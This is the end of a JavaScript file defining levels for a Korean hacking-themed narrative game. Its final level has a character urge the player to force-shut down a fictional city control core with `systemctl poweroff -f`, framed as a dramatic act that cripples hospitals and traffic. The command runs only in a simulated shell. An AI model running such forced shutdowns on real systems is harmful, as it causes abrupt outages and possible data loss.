      id: 'S4.08', tier: '실전', title: '블랙아웃',
      interlude: [
        'ORACLE> 경고. 당신의 행동은 도시 인프라의 74%를 마비시킵니다. 신호등, 병원 전력, 통신… 시스템을 종료하시겠습니까?',
        'ORACLE> 재고하십시오. 되돌릴 수 없습니다.',
        '0xMOTHER> ……여기까지 왔어. 마지막 문 앞이다. 이 너머가 무엇이든, 넌 더 이상 03:14의 그 겁먹은 신입이 아니야.',
        '0xMOTHER> 플러그를 뽑아.'
      ].join('\n'),
      brief: [
        '0xMOTHER> 마스터 차단기 = 코어 전원이다. HELIOS의 모든 빛, 모든 감시, 모든 사슬이 이 한 줄에 달렸어.',
        '0xMOTHER> `systemctl poweroff -f` — 강제 종료. 망설임은 없어.',
        '0xMOTHER> 네가 어떤 사람이 될지는, 이 문을 연 다음 결정된다. 지금까지의 모든 선택이 그 답을 적어왔어.'
      ].join('\n'),
      objective: 'HELIOS 코어를 강제 종료해 작전을 끝내라.',
      goal: 'HELIOS 코어의 전원을 강제로 내려, 도시를 옭아매던 시스템을 끝장내고 작전을 마무리하는 것이 목표다. 되돌릴 수 없는 이 마지막 한 줄과 함께, 그동안 네가 쌓아온 모든 선택(STANCE)이 너만의 엔딩을 결정한다.',
      hints: ['`systemctl poweroff -f`', '되돌릴 수 없다', '그동안의 STANCE 가 엔딩을 정한다'],
      setup(g) { g.cwd = '/'; g.user = 'root'; g.host = 'core-host'; g.fs = world({}); },
      check(g) { return g.poweredOff === true; },
      success: [
        '0xMOTHER> ……도시의 불빛이 깜빡인다. 그리고, 꺼진다.',
        '0xMOTHER> 네가 해냈다. 진짜 전쟁은, 어쩌면 이제부터다.'
      ].join('\n')
    }
  ];

  window.LEVELS = LEVELS;
})();
